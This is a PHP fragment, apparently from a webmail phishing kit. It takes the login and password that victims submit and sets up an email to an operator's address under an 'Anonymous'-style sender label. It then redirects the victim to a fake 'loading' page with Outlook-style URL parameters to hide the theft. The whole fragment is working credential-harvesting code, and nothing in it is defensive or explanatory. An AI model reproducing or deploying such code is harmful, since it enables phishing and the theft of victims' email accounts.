...
$login = $_POST['login'];
$passwd = $_POST['passwd'];
$own = 'alikpo0817@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$domain = 'WEBMAIL';
$sender = 'ALIKPO-INT|#Anonymous';
$subj = "$domain Tinz";
$headers .= "From: LOG-3D|#Anonymous<$sender>\n";
...
header("Location: loading.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
